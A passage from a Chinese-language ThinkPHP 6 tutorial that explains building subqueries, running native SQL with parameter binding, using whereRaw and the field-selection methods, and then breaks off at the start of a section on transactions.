<p>fetchSql&#x65B9;&#x6CD5;&#x8868;&#x793A;&#x4E0D;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x800C;&#x53EA;&#x662F;&#x8FD4;&#x56DE;&#x6784;&#x5EFA;&#x7684;SQL&#x8BED;&#x53E5;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x4EC5;&#x4EC5;&#x652F;&#x6301;<code>select</code>&#xFF0C;&#x800C;&#x662F;&#x652F;&#x6301;&#x6240;&#x6709;&#x7684;CURD&#x67E5;&#x8BE2;&#x3002;</p>
<pre><code>$subQuery = Db::table(&apos;think_user&apos;)
    -&gt;field(&apos;id,name&apos;)
    -&gt;where(&apos;id&apos;, &apos;&gt;&apos;, 10)
    -&gt;fetchSql(true)
    -&gt;select();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/d326ce3abd56149e0c557de89e1b056f.png" alt="d326ce3abd56149e0c557de89e1b056f.png"><img src="https://s1.imagehub.cc/images/2023/01/27/104119bd72ea86f015dbe57c61311958.png" alt="104119bd72ea86f015dbe57c61311958.png"></p>
<p>&#x751F;&#x6210;&#x7684;subQuery&#x7ED3;&#x679C;&#x4E3A;&#xFF1A;</p>
<pre><code>SELECT `id`,`name` FROM `think_user` WHERE `id` &gt; 10
</code></pre><h5 id="&#x4F7F;&#x7528;buildsql&#x6784;&#x9020;&#x5B50;&#x67E5;&#x8BE2;">&#x4F7F;&#x7528;<code>buildSql</code>&#x6784;&#x9020;&#x5B50;&#x67E5;&#x8BE2;</h5>
<pre><code>$subQuery = Db::table(&apos;think_user&apos;)
    -&gt;field(&apos;id,name&apos;)
    -&gt;where(&apos;id&apos;, &apos;&gt;&apos;, 10)
    -&gt;buildSql();
</code></pre><p>&#x751F;&#x6210;&#x7684;subQuery&#x7ED3;&#x679C;&#x4E3A;&#xFF1A;</p>
<pre><code>( SELECT `id`,`name` FROM `think_user` WHERE `id` &gt; 10 )
</code></pre><p>&#x8C03;&#x7528;<code>buildSql</code>&#x65B9;&#x6CD5;&#x540E;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x5B9E;&#x9645;&#x7684;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x751F;&#x6210;&#x8BE5;&#x6B21;&#x67E5;&#x8BE2;&#x7684;SQL&#x8BED;&#x53E5;&#xFF08;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x6DF7;&#x6DC6;&#xFF0C;&#x4F1A;&#x5728;SQL&#x4E24;&#x8FB9;&#x52A0;&#x4E0A;&#x62EC;&#x53F7;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x5728;&#x540E;&#x7EED;&#x7684;&#x67E5;&#x8BE2;&#x4E2D;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x3002;</p>
<p>&#x7136;&#x540E;&#x4F7F;&#x7528;&#x5B50;&#x67E5;&#x8BE2;&#x6784;&#x9020;&#x65B0;&#x7684;&#x67E5;&#x8BE2;&#xFF1A;</p>
<pre><code>Db::table($subQuery . &apos; a&apos;)
    -&gt;where(&apos;a.name&apos;, &apos;like&apos;, &apos;thinkphp&apos;)
    -&gt;order(&apos;id&apos;, &apos;desc&apos;)
    -&gt;select();
</code></pre><p>&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;</p>
<pre><code>SELECT * FROM ( SELECT `id`,`name` FROM `think_user` WHERE `id` &gt; 10 ) a WHERE a.name LIKE &apos;thinkphp&apos; ORDER BY `id` desc
</code></pre><h5 id="&#x4F7F;&#x7528;&#x95ED;&#x5305;&#x6784;&#x9020;&#x5B50;&#x67E5;&#x8BE2;">&#x4F7F;&#x7528;&#x95ED;&#x5305;&#x6784;&#x9020;&#x5B50;&#x67E5;&#x8BE2;</h5>
<p><code>IN/NOT IN</code>&#x548C;<code>EXISTS/NOT EXISTS</code>&#x4E4B;&#x7C7B;&#x7684;&#x67E5;&#x8BE2;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x95ED;&#x5305;&#x4F5C;&#x4E3A;&#x5B50;&#x67E5;&#x8BE2;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)
    -&gt;where(&apos;id&apos;, &apos;IN&apos;, function ($query) {
        $query-&gt;table(&apos;think_profile&apos;)-&gt;where(&apos;status&apos;, 1)-&gt;field(&apos;id&apos;);
    })
    -&gt;select();
</code></pre><p>&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;</p>
<pre><code>SELECT * FROM `think_user` WHERE `id` IN ( SELECT `id` FROM `think_profile` WHERE `status` = 1 )
Db::table(&apos;think_user&apos;)
    -&gt;whereExists(function ($query) {
        $query-&gt;table(&apos;think_profile&apos;)-&gt;where(&apos;status&apos;, 1);
    })-&gt;find();
</code></pre><p>&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x4E3A;</p>
<pre><code>SELECT * FROM `think_user` WHERE EXISTS ( SELECT * FROM `think_profile` WHERE `status` = 1 )
</code></pre><blockquote>
<p>&#x9664;&#x4E86;&#x4E0A;&#x8FF0;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x5916;&#xFF0C;&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x4E5F;&#x652F;&#x6301;&#x4F7F;&#x7528;&#x95ED;&#x5305;&#x5B50;&#x67E5;&#x8BE2;</p>
</blockquote>
<h4 id="&#x539F;&#x751F;&#x67E5;&#x8BE2;">&#x539F;&#x751F;&#x67E5;&#x8BE2;</h4>
<p><code>Db</code>&#x7C7B;&#x652F;&#x6301;&#x539F;&#x751F;<code>SQL</code>&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#xFF0C;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4E0B;&#x9762;&#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#xFF1A;</p>
<blockquote>
<p><code>V6.0.3+</code>&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;&#x539F;&#x751F;&#x67E5;&#x8BE2;&#x4EC5;&#x652F;&#x6301;Db&#x7C7B;&#x64CD;&#x4F5C;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x5728;&#x6A21;&#x578B;&#x4E2D;&#x8C03;&#x7528;&#x539F;&#x751F;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#xFF08;&#x5305;&#x62EC;<code>query</code>&#x548C;<code>execute</code>&#x65B9;&#x6CD5;&#xFF09;&#x3002;</p>
</blockquote>
<h5 id="query&#x65B9;&#x6CD5;"><code>query</code>&#x65B9;&#x6CD5;</h5>
<p><code>query</code>&#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x6267;&#x884C;<code>SQL</code>&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD4;&#x56DE;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x6570;&#x7EC4;&#xFF09;&#x3002;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/d79f8bf1b8dd9b6746d73d1d4d6008eb.png" alt="d79f8bf1b8dd9b6746d73d1d4d6008eb.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/8faf417cf9822c4d50c7e0ad1aae90eb.png" alt="8faf417cf9822c4d50c7e0ad1aae90eb.png"></p>
<p>&#x4F7F;&#x7528;&#x793A;&#x4F8B;&#xFF1A;</p>
<pre><code>Db::query(&quot;select * from think_user where status=:id&quot;, [&apos;id&apos; =&gt; 1]);
</code></pre><blockquote>
<p>&#x5982;&#x679C;&#x4F60;&#x5F53;&#x524D;&#x91C7;&#x7528;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x4E14;&#x8BBE;&#x7F6E;&#x4E86;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x8BDD;&#xFF0C;<code>query</code>&#x65B9;&#x6CD5;&#x9ED8;&#x8BA4;&#x662F;&#x5728;&#x8BFB;&#x670D;&#x52A1;&#x5668;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x4E0D;&#x7BA1;&#x4F60;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#x4EC0;&#x4E48;&#x3002;</p>
</blockquote>
<p>&#x5982;&#x679C;&#x5E0C;&#x671B;&#x4ECE;&#x4E3B;&#x5E93;&#x8BFB;&#x53D6;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>Db::query(&quot;select * from think_user where status=:id&quot;, [&apos;id&apos; =&gt; 1], true);
</code></pre><h5 id="execute&#x65B9;&#x6CD5;"><code>execute</code>&#x65B9;&#x6CD5;</h5>
<p><code>execute</code>&#x7528;&#x4E8E;&#x66F4;&#x65B0;&#x548C;&#x5199;&#x5165;&#x6570;&#x636E;&#x7684;sql&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x636E;&#x975E;&#x6CD5;&#x6216;&#x8005;&#x67E5;&#x8BE2;&#x9519;&#x8BEF;&#x5219;&#x8FD4;&#x56DE;<code>false</code>&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE;&#x5F71;&#x54CD;&#x7684;&#x8BB0;&#x5F55;&#x6570;&#x3002;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/202af87c336160b10995988f271dc985.png" alt="202af87c336160b10995988f271dc985.png"><img src="https://s1.imagehub.cc/images/2023/01/27/cc38c77090c4369f0455bff9b26bae50.png" alt="cc38c77090c4369f0455bff9b26bae50.png"><img src="https://s1.imagehub.cc/images/2023/01/27/a71004ef87f0d3dad2eca01de8f821e6.png" alt="a71004ef87f0d3dad2eca01de8f821e6.png"></p>
<p>&#x4F7F;&#x7528;&#x793A;&#x4F8B;&#xFF1A;</p>
<pre><code>Db::execute(&quot;update think_user set name=&apos;thinkphp&apos; where status=1&quot;);
</code></pre><blockquote>
<p>&#x5982;&#x679C;&#x4F60;&#x5F53;&#x524D;&#x91C7;&#x7528;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x4E14;&#x8BBE;&#x7F6E;&#x4E86;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x8BDD;&#xFF0C;<code>execute</code>&#x65B9;&#x6CD5;&#x59CB;&#x7EC8;&#x662F;&#x5728;&#x5199;&#x670D;&#x52A1;&#x5668;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x4E0D;&#x7BA1;&#x4F60;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#x4EC0;&#x4E48;&#x3002;</p>
</blockquote>
<h5 id="&#x53C2;&#x6570;&#x7ED1;&#x5B9A;">&#x53C2;&#x6570;&#x7ED1;&#x5B9A;</h5>
<p>&#x652F;&#x6301;&#x5728;&#x539F;&#x751F;&#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;&#x53C2;&#x6570;&#x7ED1;&#x5B9A;&#xFF0C;&#x5305;&#x62EC;&#x95EE;&#x53F7;&#x5360;&#x4F4D;&#x7B26;&#x6216;&#x8005;&#x547D;&#x540D;&#x5360;&#x4F4D;&#x7B26;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::query(&quot;select * from think_user where id=? AND status=?&quot;, [8, 1]);
// &#x547D;&#x540D;&#x7ED1;&#x5B9A;
Db::execute(&quot;update think_user set name=:name where status=:status&quot;, [&apos;name&apos; =&gt; &apos;thinkphp&apos;, &apos;status&apos; =&gt; 1])
</code></pre><h3 id="&#x94FE;&#x5F0F;&#x67E5;&#x8BE2;">&#x94FE;&#x5F0F;&#x67E5;&#x8BE2;</h3>
<p>&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x6761;&#x4EF6;&#x76F4;&#x63A5;&#x67E5;&#x8BE2;&#x548C;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;whereRaw(&apos;type=1 AND status=1&apos;)-&gt;select();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/28ab3f759a40effedea7d4e76353a05d.png" alt="28ab3f759a40effedea7d4e76353a05d.png"><img src="https://s1.imagehub.cc/images/2023/01/27/8ad06334a73954ae1d540bb7ac44de39.png" alt="8ad06334a73954ae1d540bb7ac44de39.png"></p>
<p>&#x6700;&#x540E;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;</p>
<pre><code>SELECT * FROM think_user WHERE type=1 AND status=1
</code></pre><blockquote>
<p>&#x6CE8;&#x610F;&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x548C;&#x8868;&#x8FBE;&#x5F0F;&#x67E5;&#x8BE2;&#x7684;&#x4E00;&#x4E2A;&#x533A;&#x522B;&#x5728;&#x4E8E;&#xFF0C;&#x4E0D;&#x4F1A;&#x5BF9;&#x67E5;&#x8BE2;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x907F;&#x514D;&#x5173;&#x952E;&#x8BCD;&#x51B2;&#x7A81;&#x5904;&#x7406;&#x3002;</p>
</blockquote>
<p>&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x6761;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x4F20;&#x5165;&#x53D8;&#x91CF;&#xFF0C;&#x5EFA;&#x8BAE;&#x914D;&#x5408;&#x9884;&#x5904;&#x7406;&#x673A;&#x5236;&#xFF0C;&#x786E;&#x4FDD;&#x66F4;&#x52A0;&#x5B89;&#x5168;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)
-&gt;whereRaw(&quot;id=:id and username=:name&quot;, [&apos;id&apos; =&gt; 1 , &apos;name&apos; =&gt; &apos;thinkphp&apos;])
-&gt;select();
</code></pre><h5 id="field">field</h5>
<p><code>field</code>&#x65B9;&#x6CD5;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x662F;&#x6807;&#x8BC6;&#x8981;&#x8FD4;&#x56DE;&#x6216;&#x8005;&#x64CD;&#x4F5C;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x67E5;&#x8BE2;&#x548C;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x3002;</p>
<h5 id="&#x7528;&#x4E8E;&#x67E5;&#x8BE2;">&#x7528;&#x4E8E;&#x67E5;&#x8BE2;</h5>
<h5 id="&#x6307;&#x5B9A;&#x5B57;&#x6BB5;">&#x6307;&#x5B9A;&#x5B57;&#x6BB5;</h5>
<p>&#x5728;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x4E2D;<code>field</code>&#x65B9;&#x6CD5;&#x662F;&#x4F7F;&#x7528;&#x6700;&#x9891;&#x7E41;&#x7684;&#x3002;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;field(&apos;id,title,content&apos;)-&gt;select();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/f802931142b015a322bd5c532da1281a.png" alt="f802931142b015a322bd5c532da1281a.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/8cab6ad03a3ca7e9b9bb7b02cd0b2b02.png" alt="8cab6ad03a3ca7e9b9bb7b02cd0b2b02.png"></p>
<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;field&#x65B9;&#x6CD5;&#x6307;&#x5B9A;&#x4E86;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x96C6;&#x4E2D;&#x5305;&#x542B;id,title,content&#x4E09;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x3002;&#x6267;&#x884C;&#x7684;SQL&#x76F8;&#x5F53;&#x4E8E;&#xFF1A;</p>
<pre><code>SELECT id,title,content FROM user
</code></pre><p>&#x53EF;&#x4EE5;&#x7ED9;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x8BBE;&#x7F6E;&#x522B;&#x540D;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;field(&apos;id,nickname as name&apos;)-&gt;select();
</code></pre><p>&#x6267;&#x884C;&#x7684;SQL&#x8BED;&#x53E5;&#x76F8;&#x5F53;&#x4E8E;&#xFF1A;</p>
<pre><code>SELECT id,nickname as name FROM user
</code></pre><h5 id="&#x4F7F;&#x7528;sql&#x51FD;&#x6570;">&#x4F7F;&#x7528;SQL&#x51FD;&#x6570;</h5>
<p>&#x53EF;&#x4EE5;&#x5728;<code>fieldRaw</code>&#x65B9;&#x6CD5;&#x4E2D;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x51FD;&#x6570;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;fieldRaw(&apos;id,SUM(score)&apos;)-&gt;select();
</code></pre><p>&#x6267;&#x884C;&#x7684;SQL&#x76F8;&#x5F53;&#x4E8E;&#xFF1A;</p>
<pre><code>SELECT id,SUM(score) FROM user
</code></pre><blockquote>
<p>&#x9664;&#x4E86;<code>select</code>&#x65B9;&#x6CD5;&#x4E4B;&#x5916;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;<code>find</code>&#x7B49;&#x90FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>field</code>&#x65B9;&#x6CD5;&#x3002;</p>
</blockquote>
<h5 id="&#x4F7F;&#x7528;&#x6570;&#x7EC4;&#x53C2;&#x6570;">&#x4F7F;&#x7528;&#x6570;&#x7EC4;&#x53C2;&#x6570;</h5>
<p><code>field</code>&#x65B9;&#x6CD5;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x6570;&#x7EC4;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;field([&apos;id&apos;,&apos;title&apos;,&apos;content&apos;])-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x6267;&#x884C;&#x7684;SQL&#x548C;&#x524D;&#x9762;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x65B9;&#x5F0F;&#x662F;&#x7B49;&#x6548;&#x7684;&#x3002;</p>
<p>&#x6570;&#x7EC4;&#x65B9;&#x5F0F;&#x7684;&#x5B9A;&#x4E49;&#x53EF;&#x4EE5;&#x4E3A;&#x67D0;&#x4E9B;&#x5B57;&#x6BB5;&#x5B9A;&#x4E49;&#x522B;&#x540D;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;field([&apos;id&apos;,&apos;nickname&apos;=&gt;&apos;name&apos;])-&gt;select();
</code></pre><p>&#x6267;&#x884C;&#x7684;SQL&#x76F8;&#x5F53;&#x4E8E;&#xFF1A;</p>
<pre><code>SELECT id,nickname as name FROM user
</code></pre><h5 id="&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5B57;&#x6BB5;">&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5B57;&#x6BB5;</h5>
<p>&#x5982;&#x679C;&#x6709;&#x4E00;&#x4E2A;&#x8868;&#x6709;&#x975E;&#x5E38;&#x591A;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BB5;&#xFF08;&#x8FD9;&#x4E2A;&#x4E5F;&#x8BB8;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x8C03;&#x7528;field&#x65B9;&#x6CD5;&#x6216;&#x8005;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x7A7A;&#x7684;field&#x65B9;&#x6CD5;&#x90FD;&#x80FD;&#x505A;&#x5230;&#xFF09;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;select();
Db::table(&apos;user&apos;)-&gt;field(&apos;*&apos;)-&gt;select();
</code></pre><p>&#x4E0A;&#x9762;&#x7684;&#x7528;&#x6CD5;&#x662F;&#x7B49;&#x6548;&#x7684;&#xFF0C;&#x90FD;&#x76F8;&#x5F53;&#x4E8E;&#x6267;&#x884C;SQL&#xFF1A;</p>
<pre><code>SELECT * FROM user
</code></pre><p>&#x4F46;&#x662F;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x6211;&#x8BF4;&#x7684;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5B57;&#x6BB5;&#xFF0C;&#x800C;&#x662F;&#x663E;&#x5F0F;&#x7684;&#x8C03;&#x7528;&#x6240;&#x6709;&#x5B57;&#x6BB5;&#xFF08;&#x5BF9;&#x4E8E;&#x5BF9;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x6BD4;&#x8F83;&#x9AD8;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x4E2A;&#x8981;&#x6C42;&#x5E76;&#x4E0D;&#x8FC7;&#x5206;&#xFF0C;&#x8D77;&#x7801;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x4E60;&#x60EF;&#xFF09;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x7528;&#x6CD5;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x9884;&#x671F;&#x7684;&#x4F5C;&#x7528;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;field(true)-&gt;select();
</code></pre><p><code>field(true)</code>&#x7684;&#x7528;&#x6CD5;&#x4F1A;&#x663E;&#x5F0F;&#x7684;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x8868;&#x7684;&#x6240;&#x6709;&#x5B57;&#x6BB5;&#x5217;&#x8868;&#xFF0C;&#x54EA;&#x6015;&#x4F60;&#x7684;&#x6570;&#x636E;&#x8868;&#x6709;100&#x4E2A;&#x5B57;&#x6BB5;&#x3002;</p>
<h5 id="&#x5B57;&#x6BB5;&#x6392;&#x9664;">&#x5B57;&#x6BB5;&#x6392;&#x9664;</h5>
<p>&#x5982;&#x679C;&#x6211;&#x5E0C;&#x671B;&#x83B7;&#x53D6;&#x6392;&#x9664;&#x6570;&#x636E;&#x8868;&#x4E2D;&#x7684;<code>content</code>&#x5B57;&#x6BB5;&#xFF08;&#x6587;&#x672C;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x975E;&#x5E38;&#x8017;&#x5185;&#x5B58;&#xFF09;&#x4E4B;&#x5916;&#x7684;&#x6240;&#x6709;&#x5B57;&#x6BB5;&#x503C;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;field&#x65B9;&#x6CD5;&#x7684;&#x6392;&#x9664;&#x529F;&#x80FD;&#xFF0C;&#x4F8B;&#x5982;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6240;&#x8BF4;&#x7684;&#x529F;&#x80FD;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;withoutField(&apos;content&apos;)-&gt;select();
</code></pre><p>&#x5219;&#x8868;&#x793A;&#x83B7;&#x53D6;&#x9664;&#x4E86;content&#x4E4B;&#x5916;&#x7684;&#x6240;&#x6709;&#x5B57;&#x6BB5;&#xFF0C;&#x8981;&#x6392;&#x9664;&#x66F4;&#x591A;&#x7684;&#x5B57;&#x6BB5;&#x4E5F;&#x53EF;&#x4EE5;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;withoutField(&apos;user_id,content&apos;)-&gt;select();
//&#x6216;&#x8005;&#x7528;
Db::table(&apos;user&apos;)-&gt;withoutField([&apos;user_id&apos;,&apos;content&apos;])-&gt;select();
</code></pre><blockquote>
<p>&#x6CE8;&#x610F;&#x7684;&#x662F; &#x5B57;&#x6BB5;&#x6392;&#x9664;&#x529F;&#x80FD;&#x4E0D;&#x652F;&#x6301;&#x8DE8;&#x8868;&#x548C;join&#x64CD;&#x4F5C;&#x3002;</p>
</blockquote>
<h5 id="&#x7528;&#x4E8E;&#x5199;&#x5165;">&#x7528;&#x4E8E;&#x5199;&#x5165;</h5>
<p>&#x9664;&#x4E86;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x4E4B;&#x5916;&#xFF0C;<code>field</code>&#x65B9;&#x6CD5;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x5B89;&#x5168;&#x529F;&#x80FD;--<strong>&#x5B57;&#x6BB5;&#x5408;&#x6CD5;&#x6027;&#x68C0;&#x6D4B;</strong>&#x3002;<code>field</code>&#x65B9;&#x6CD5;&#x7ED3;&#x5408;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5199;&#x5165;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x8868;&#x5355;&#x63D0;&#x4EA4;&#x7684;&#x5B57;&#x6BB5;&#x5408;&#x6CD5;&#x6027;&#x68C0;&#x6D4B;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5728;&#x8868;&#x5355;&#x63D0;&#x4EA4;&#x7684;&#x5904;&#x7406;&#x65B9;&#x6CD5;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#xFF1A;</p>
<pre><code>Db::table(&apos;user&apos;)-&gt;field(&apos;title,email,content&apos;)-&gt;insert($data);
</code></pre><p>&#x5373;&#x8868;&#x793A;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x5408;&#x6CD5;&#x5B57;&#x6BB5;&#x53EA;&#x6709;<code>title</code>,<code>email</code>&#x548C;<code>content</code>&#x5B57;&#x6BB5;&#xFF0C;&#x65E0;&#x8BBA;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x4EC0;&#x4E48;&#x624B;&#x6BB5;&#x66F4;&#x6539;&#x6216;&#x8005;&#x6DFB;&#x52A0;&#x4E86;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x63D0;&#x4EA4;&#x5B57;&#x6BB5;&#xFF0C;&#x90FD;&#x4F1A;&#x76F4;&#x63A5;&#x5C4F;&#x853D;&#x3002;&#x56E0;&#x4E3A;&#xFF0C;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x5B57;&#x6BB5;&#x6211;&#x4EEC;&#x90FD;&#x4E0D;&#x5E0C;&#x671B;&#x7531;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x6765;&#x51B3;&#x5B9A;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x5B8C;&#x6210;&#x529F;&#x80FD;&#x5B9A;&#x4E49;&#x989D;&#x5916;&#x9700;&#x8981;&#x81EA;&#x52A8;&#x5199;&#x5165;&#x7684;&#x5B57;&#x6BB5;&#x3002;</p>
<blockquote>
<p>&#x5728;&#x5F00;&#x542F;&#x6570;&#x636E;&#x8868;&#x5B57;&#x6BB5;&#x4E25;&#x683C;&#x68C0;&#x67E5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x63D0;&#x4EA4;&#x4E86;&#x975E;&#x6CD5;&#x5B57;&#x6BB5;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;&#xFF1A;</p>
<pre><code>// &#x5173;&#x95ED;&#x4E25;&#x683C;&#x5B57;&#x6BB5;&#x68C0;&#x67E5;
&apos;fields_strict&apos;    =&gt;    false,
</code></pre></blockquote>
<h4 id="&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;">&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;</h4>
<blockquote>
<p><code>MySQL</code> &#x7684; <code>MyISAM</code> &#x4E0D;&#x652F;&#x6301;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528; <code>InnoDB</code> &#x5F15;&#x64CE;&#x3002;</p>
</blockquote>
<p>&#x573A;&#x666F;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x6267;&#x884C;&#x4E86;</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">things</span><span class="hljs-params">()</span>
    </span>{
        Db::table(ty_user)-&gt;where(<span class="hljs-string">&apos;id=1&apos;</span>)-&gt;find(<span class="hljs-number">1</span>);
        Db::table(ty_user1)-&gt;where(<span class="hljs-string">&apos;id=1&apos;</span>)-&gt;delete(<span class="hljs-number">1</span>);
    }
</code></pre>
